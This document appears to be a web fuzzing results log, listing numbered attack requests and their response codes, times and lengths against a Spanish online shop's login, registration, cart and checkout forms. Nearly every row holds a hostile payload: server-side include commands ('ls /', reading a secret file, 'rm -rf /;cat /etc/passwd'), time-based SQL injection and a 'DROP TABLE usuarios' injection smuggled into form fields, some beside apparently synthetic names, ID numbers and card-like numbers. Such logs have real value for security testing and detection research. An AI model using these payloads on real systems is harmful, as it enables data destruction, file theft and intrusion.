Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
363	"insertar | 4236 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	170	false	false	3923	
237	"entrar | gavens0 | <!--#EXEC cmd=""ls /""--> | on | Entrar HTTP/1.1"	200	89	false	false	3922	
76	"insertar<!--#EXEC cmd=""ls /""--> | 3845 | Pasar por caja HTTP/1.1"	200	115	false	false	3921	
119	"insertar | 6525 | Pasar por caja<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	77	false	false	3921	
149	"2 | Queso Manchego | 100 | 44 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	73	false	false	3921	
192	"insertar | 3212<!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"	200	89	false	false	3921	
253	"1 | Queso Manchego | 39 | 59 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	83	false	false	3920	
327	"3 | Queso Manchego | 39 | 67 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	117	false	false	3920	
100	"Vaciar carrito<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	93	false	false	3919	
15	"insertar | <!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"	200	80	false	false	3917	
242	"insertar | 88 | Confirmar<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	69	false	false	3914	
130	"Credenciales incorrectas<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	111	false	false	3913	
82	"2<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	115	false	false	3911	
111	"1<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	85	false	false	3911	
17	"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"	200	119	false	false	3910	
37	"1""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	115	false	false	3910	
239	"2""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	78	false	false	3910	
2	"""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"	200	141	false	false	3909	
223	"insertar | 8496 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	92	false	false	3907	
247	"<!--#EXEC cmd=""ls /""--> | 346 | Confirmar HTTP/1.1"	200	82	false	false	3907	
31	"1<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	87	false	false	3906	
67	"2<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	189	false	false	3906	
289	"insertar | 810 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	121	false	false	3906	
10	"<!--#include file=""archivo_secreto"" --> HTTP/1.1"	200	136	false	false	3905	
93	"Vaciar carrito<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	102	false	false	3903	
128	"1<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	74	false	false	3890	
230	"2<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	89	false	false	3890	
87	"<!--#EXEC cmd=""ls /""--> HTTP/1.1"	200	74	false	false	3889	
369		200	141	false	false	3817	
1	"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1"	500	96	false	false	2619	
3	"1','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	141	false	false	2619	
5	');waitfor delay '0:0:15';-- HTTP/1.1	500	98	false	false	2619	
6	"','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	98	false	false	2619	
8	"registro | nyberg | predicha | Carmina | Serarols Ginesta | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | ';waitfor delay '0:0:15' ...	500	140	false	false	2619	
9	Vaciar carrito'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	140	false	false	2619	
11	1');waitfor delay '0:0:15';-- HTTP/1.1	500	92	false	false	2619	
12	"Credenciales incorrectas','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	109	false	false	2619	
13	');waitfor delay '0:0:15';-- | 4762 | Confirmar HTTP/1.1	500	109	false	false	2619	
14	"Vaciar carrito','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	109	false	false	2619	
18	"','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	120	false	false	2619	
19	insertar | 7641 | ';waitfor delay '0:0:15';-- HTTP/1.1	500	120	false	false	2619	
20	"entrar | dadang','0','0');waitfor delay '0:0:15';-- | 6a1er87 | on | Entrar HTTP/1.1"	500	83	false	false	2619	
22	"insertar | 4639 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	111	false	false	2619	
23	'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	112	false	false	2619	
25	"3 | Vino Rioja | 39 | 69 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	77	false	false	2619	
29	"insertar | 898 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	77	false	false	2619	
33	"registro | mccarron | revistero | Adelqui | Valente Sanchis','0');waitfor delay '0:0:15';-- | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | R ...	500	84	false	false	2619	
34	';waitfor delay '0:0:15';-- HTTP/1.1	500	72	false	false	2619	
35	"insertar | 795 | Pasar por caja','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
36	"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | '; DROP TA ...	500	116	false	false	2619	
38	"entrar | espinosa | candado | off','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	78	false	false	2619	
40	"Vaciar carrito','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	80	false	false	2619	
41	"','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	88	false	false	2619	
44	insertar | 2860 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	84	false	false	2619	
45	insertar | ');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1	500	79	false	false	2619	
46	"registro | muise | l321n2c3r','0','0','0');waitfor delay '0:0:15';-- | Matco | Yera Patriz | bacall@djbroadcast.hk | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 991780 ...	500	105	false	false	2619	
47	"2','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	103	false	false	2619	
48	1';waitfor delay '0:0:15';-- HTTP/1.1	500	105	false	false	2619	
50	"entrar | yansun | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	85	false	false	2619	
51	"','0');waitfor delay '0:0:15';-- | 9805 | Pasar por caja HTTP/1.1"	500	103	false	false	2619	
53	"1','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	103	false	false	2619	
54	');waitfor delay '0:0:15';-- | 4564 | Confirmar HTTP/1.1	500	85	false	false	2619	
55	"','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	85	false	false	2619	
56	insertar | 8789 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	101	false	false	2619	
60	Vaciar carrito');waitfor delay '0:0:15';-- HTTP/1.1	500	101	false	false	2619	
61	1'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	78	false	false	2619	
62	entrar | alvarez | 9ec828'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | on | Entrar HTTP/1.1	500	93	false	false	2619	
65	insertar | 342 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	125	false	false	2619	
66	"Credenciales incorrectas','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	189	false	false	2619	
68	Credenciales incorrectas');waitfor delay '0:0:15';-- HTTP/1.1	500	119	false	false	2619	
69	"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras','0','0','0','0');waitfor delay '0:0:15';-- | 43393 | Valencia | 84 ...	500	189	false	false	2619	
71	"insertar','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1"	500	184	false	false	2619	
72	insertar | 8588 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	162	false	false	2619	
73	"entrar | drusie | cAreRa','0','0','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	152	false	false	2619	
74	"insertar | 5741 | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	101	false	false	2619	
75	"entrar | burch | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	103	false	false	2619	
77	"Credenciales incorrectas','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
78	"entrar | odecki | le080i12 | off | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	123	false	false	2619	
81	"registro | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salaman ...	500	102	false	false	2619	
83	"entrar | zakarow','0','0');waitfor delay '0:0:15';-- | e4pe5imenta2a | on | Entrar HTTP/1.1"	500	115	false	false	2619	
84	"Vaciar carrito','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
85	"entrar | dane | e3970iv4r | ','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	115	false	false	2619	
86	"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H');waitfor delay '0:0:15';-- | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 89642 ...	500	97	false	false	2619	
89	Credenciales incorrectas'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	103	false	false	2619	
91	"insertar | ','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	103	false	false	2619	
92	"','0');waitfor delay '0:0:15';-- | marconi1 | adularia | Venancio | Del Campillo Aranda | blier@ropadegolf.com.at | 70108873C | Paratge Pla 18 8?D | Sotorribas | 15391 | Soria | 6078216616409598  ...	500	132	false	false	2619	
94	"entrar | lombardy','0','0','0');waitfor delay '0:0:15';-- | j543ihue3a | on | Entrar HTTP/1.1"	500	132	false	false	2619	
95	2');waitfor delay '0:0:15';-- HTTP/1.1	500	103	false	false	2619	
96	"Credenciales incorrectas','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	111	false	false	2619	
97	"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	111	false	false	2619	
98	"Vaciar carrito','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	79	false	false	2619	
99	"registro | jessalyn | tra8ucaire | Ventura | Codinacs Bellver | nace@9horas.mg | 55526590J | C/ Zumalacarregui 4 11?H | ','0','0');waitfor delay '0:0:15';-- | 40541 | Segovia | 2481775887753084 | ...	500	93	false	false	2619	
101	"registro | alair | TubuL6s8 | Reade | Elecciones Iznaga','0','0','0');waitfor delay '0:0:15';-- | rypdal.hidayat@hiperbilbao.bw | 65285775E | Condor, 82 13?E | Paracuellos de la Ribera | 34870 |  ...	500	59	false	false	2619	
103	registro | pascali | o73-r1111 | Helidora | Estrems | cederlund-sol@aulahost.qa | 90572791X | Calle Urquizu 190 11?F | Santa Magdalena de Pulpis | 05697 | Zaragoza'; DROP TABLE usuarios; SELECT *  ...	500	93	false	false	2619	
104	insertar | 7744 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	73	false	false	2619	
105	"','0','0','0','0');waitfor delay '0:0:15';-- | cecelia | terciopelado | Federica | Heusser Talo | sofaer@multasdetransito.cu | 67293578V | Plza. Irantzuko Monasterioaren 63,  | Purullena | 41111  ...	500	73	false	false	2619	
106	Vaciar carrito';waitfor delay '0:0:15';-- HTTP/1.1	500	73	false	false	2619	
110	entrar | hope | infR06g9ble | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	85	false	false	2619	
112	"registro | bagnato33 | prescindible | Hiram','0','0','0','0');waitfor delay '0:0:15';-- | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | ...	500	84	false	false	2619	
114	entrar | robyn | frutillero');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1	500	98	false	false	2619	
115	"insertar','0','0','0');waitfor delay '0:0:15';-- | 2542 | Confirmar HTTP/1.1"	500	75	false	false	2619	
116	Credenciales incorrectas';waitfor delay '0:0:15';-- HTTP/1.1	500	98	false	false	2619	
120	entrar | chihchie');waitfor delay '0:0:15';-- | unicidad | off | Entrar HTTP/1.1	500	85	false	false	2619	
121	entrar | chihchie | unicidad | off | ');waitfor delay '0:0:15';-- HTTP/1.1	500	111	false	false	2619	
125	"entrar | an-son | 4up493a562i5 | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	86	false	false	2619	
126	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 4up493a562i5 | on | Entrar HTTP/1.1"	500	72	false	false	2619	
127	insertar | 5289 | Pasar por caja');waitfor delay '0:0:15';-- HTTP/1.1	500	86	false	false	2619	
129	2 | Queso Manchego | 39 | 27 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	88	false	false	2619	
131	insertar | 7436 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	83	false	false	2619	
133	"registro | hilwa | 79b664ve80 | Delva | Campas Ferrete | everrett@fernandosoto.zr | ','0','0','0','0');waitfor delay '0:0:15';-- | Calle Salares 27 9-B | Teresa | 10162 | Alicante | 8640086440167 ...	500	104	false	false	2619	
134	"registro | torok | 03f3so | Noel Stefani | Vilaseca Regalado | howell@zarasalud.mw | 17400980P | C/ San Andres 79, 7?A | Fontiveros | 49254 | ';waitfor delay '0:0:15';-- | 4507218709160906 | Regi ...	500	105	false	false	2619	
138	entrar | mcnair | 81cob6r | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	91	false	false	2619	
139	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 569t179e | on | Entrar HTTP/1.1"	500	116	false	false	2619	
142	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 6072 | Pasar por caja HTTP/1.1	500	103	false	false	2619	
143	"registro | hiroyuki | desbullar | Yoconda | Rosas Fabila | saiko@enlanzarote.com.cx | 29372836L | Barriada Juan Xxiii, 100,  | Almargen','0');waitfor delay '0:0:15';-- | 03812 | Toledo | 22181025 ...	500	103	false	false	2619	
145	';waitfor delay '0:0:15';-- | ovas | ric8Me6te | on | Entrar HTTP/1.1	500	68	false	false	2619	
146	"2','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	102	false	false	2619	
150	"registro | storelli | enforrar | Adelfo | Pozo Carbot | schiaftino@showenvivo.com.sy');waitfor delay '0:0:15';-- | 56891172M | Calle Virgen De La Estrella, 150,  | Fresno de Rodilla | 49624 | Val ...	500	102	false	false	2619	
151	"registro | swick | recalzar | Amiel | Del Blanco | ying-carridine@audiosat.sy | 55739537A | Jose Cadierno 186, 6F | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 37621 | Astu ...	500	111	false	false	2619	
152	"entrar','0','0');waitfor delay '0:0:15';-- | zaretsky | 725l479zo | on | Entrar HTTP/1.1"	500	104	false	false	2619	
153	entrar | zaretsky | 725l479zo | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	103	false	false	2619	
155	entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | hua-yuan | *anoria | off | Entrar HTTP/1.1	500	104	false	false	2619	
156	"','0','0');waitfor delay '0:0:15';-- | 2158 | Pasar por caja HTTP/1.1"	500	103	false	false	2619	
158	"insertar | ','0','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	103	false	false	2619	
159	registro | brittan | al9mb+532 | Onila | Furcat Zarco | greiff@opticaweb.bu | 36455660Q | Calle Nueve 57 '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Utiel | 01899 | Madrid | ...	500	107	false	false	2619	
161	"entrar | crommie | 0eju0o','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"	500	106	false	false	2619	
163	entrar | jasver9');waitfor delay '0:0:15';-- | 76r9v3t2 | off | Entrar HTTP/1.1	500	115	false	false	2619	
164	"insertar','0','0','0','0');waitfor delay '0:0:15';-- | 2018 | Pasar por caja HTTP/1.1"	500	116	false	false	2619	
165	"registro | correa | 5orTeRa | Fructuosa | Polloni Homdedeu | berto@sindualidad.dd | 49742539W | C/ Einstein, 147, 9?A | Legazpi | 44349','0');waitfor delay '0:0:15';-- | Valencia | 21693885396287 ...	500	115	false	false	2619	
167	2'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	115	false	false	2619	
